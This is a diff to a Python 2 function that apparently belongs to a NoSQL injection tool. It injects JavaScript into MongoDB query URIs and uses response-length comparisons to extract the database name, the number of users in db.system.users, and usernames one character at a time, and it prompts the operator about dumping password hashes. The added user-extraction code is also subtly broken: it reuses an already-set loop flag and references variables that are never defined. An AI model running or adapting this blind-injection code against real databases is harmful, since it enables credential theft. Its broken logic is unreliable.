@@ -1139,10 +1139,12 @@ def getDBInfo():
 	gotColLen = False
 	gotColName = False
 	gotUserCnt = False
+	finUser = False
 	dbName = ""
 	charCounter = 0
 	nameCounter = 0
 	usrCount = 0
+	usrRetr = 0
 	chars = string.ascii_letters + string.digits
 	print "Getting baseline True query return size..."
 	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
@@ -1168,7 +1170,7 @@ def getDBInfo():
 	
 	print "Database Name: ", 		
 	while gotDbName == False:
-		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } vardum='a")
+		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } vardum='a" + "&")
 		#print "Debug: " + charUri
 		
 		lenUri = int(len(urllib.urlopen(charUri).read()))
@@ -1192,6 +1194,9 @@ def getDBInfo():
 	getUserInf = raw_input("Get database users and password hashes? ")
 	
 	if getUserInf == "y" or getUserInf == "Y":
+		charCounter = 0
+		nameCounter = 0
+		#find the total number of users on the database
 		while gotUserCnt == False:
 			usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
 			lenUri = int(len(urllib.urlopen(usrCntUri).read()))
@@ -1202,6 +1207,43 @@ def getDBInfo():
 			
 			else:
 				usrCount += 1
+		
+		print "User:password hash"		
+		while usrRetr < usrCount:
+			while gotUserCnt == False:
+				#first solve for the first user in the DB
+				#figure out how long the username is
+				usrLenUri = uriArray[16].replace("---", "cur=db.system.users.findOne();uname=cur.user; if (uname.length==" + str(charCounter) + "){return true;}var dum = 'a" + "&")
+				lenUri = int(len(urllib.urlopen(usrLenUri).read()))
+			
+				if lenUri == baseLen:
+					print "First username is" + str(charCounter) + "characters."
+					gotUserCnt = True
+			
+				else:
+					charCounter += 1
+				
+		
+			while finUser == False:	
+				charUri = uriArray[16].replace("---","var cur = db.system.users.findOne(); if (cur.user.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } vardum='a" + "&")
+				#print "Debug: " + charUri
+		
+				lenUri = int(len(urllib.urlopen(charUri).read()))
+				#print "debug: " + str(charCounter)
+				#print "Debug length: " + str(lenUri)
+		
+				if lenUri == baseLen:
+					uName = uName + chars[charCounter]
+					print chars[charCounter],
+					nameCounter += 1
+					charCounter = 0
+			
+				if nameCounter == curLen:
+					finUser = True
+				
+				else:
+					charCounter += 1
+		
 		
 		
 			
